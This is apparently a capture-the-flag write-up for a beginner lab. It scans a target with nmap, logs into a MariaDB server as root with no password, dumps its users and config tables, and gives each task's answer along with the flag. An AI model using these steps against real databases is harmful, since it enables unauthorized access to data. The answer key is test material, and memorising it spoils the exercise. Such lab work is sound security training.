Connect the VPN, spawn the VM.<br>
10.129.95.232

### TASK 1

What does the acronym SQL stand for?

Answer: Structured Query Language

### TASK 2

During our scan, which port running mysql do we find?

```
# nmap -sS -n -Pn 10.129.95.232 --top-ports 20 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 07:07 EDT
Nmap scan report for 10.129.95.232
Host is up (0.22s latency).

PORT     STATE  SERVICE
21/tcp   closed ftp
22/tcp   closed ssh
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   closed http
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp open   mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```

Answer: 3306

###   
TASK 3

What community-developed MySQL version is the target running?

```
# mysql -v -h 10.129.95.232
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 95
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Reading history-file /root/.mysql_history
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Answer: MariaDB


### TASK 4

What switch do we need to use in order to specify a login username for the MySQL service?

```
mysql --help
```

Answer:  -u

### TASK 5

Which username allows us to log into MariaDB without providing a password?

```
# mysql -v -h 10.129.95.232        
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 98
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Reading history-file /root/.mysql_history
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> status
--------------
mysql  Ver 15.1 Distrib 10.6.8-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper

Connection id:          98
Current database:
Current user:           root@10.10.15.138
SSL:                    Not in use
Current pager:          stdout
Using outfile:          ''
Using delimiter:        ;
Server:                 MariaDB
Server version:         10.3.27-MariaDB-0+deb10u1 Debian 10
Protocol version:       10
Connection:             10.129.95.232 via TCP/IP
Server characterset:    utf8mb4
Db     characterset:    utf8mb4
Client characterset:    utf8
Conn.  characterset:    utf8
TCP port:               3306
Uptime:                 19 min 41 sec

Threads: 8  Questions: 68  Slow queries: 0  Opens: 32  Flush tables: 1  Open tables: 26  Queries per second avg: 0.057
--------------
```

Answer: root


### TASK 6

What symbol can we use to specify within the query that we want to display everything inside a table?

```
MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
--------------
show tables
--------------

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.225 sec)

MariaDB [htb]> select * from users;
--------------
select * from users
--------------

+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.224 sec)

MariaDB [htb]> 
```

Answer: *

### TASK 7

What symbol do we need to end each query with?

Answer: ;

### SUBMIT FLAG

Submit root flag

```
MariaDB [htb]> select * from config;
--------------
select * from config
--------------

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.240 sec)
```

Answer: 7b4bec00d1a39e3dd4e021ec3d915da8
